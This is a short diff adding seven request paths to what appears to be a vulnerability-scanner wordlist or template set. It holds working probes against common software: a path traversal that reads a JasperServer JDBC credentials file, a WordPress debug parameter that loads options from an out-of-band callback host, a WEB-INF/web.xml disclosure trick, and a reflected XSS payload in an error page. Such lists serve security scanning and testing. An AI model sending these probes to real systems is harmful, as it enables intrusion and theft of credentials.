@@ -1,0 +1,7 @@
+/jasperserver-pro/reportresource/reportresource/?resource=net/sf/jasperreports/../../../../js.jdbc.properties
+/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{{interactsh-url}}
+/s/{{randstr}}/_/;/WEB-INF/web.xml
+/zabbix/setup.php
+/setup.php
+/js/zimbraMail/share/model/ZmSettings.js
+/public/error.jsp?errCode=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E
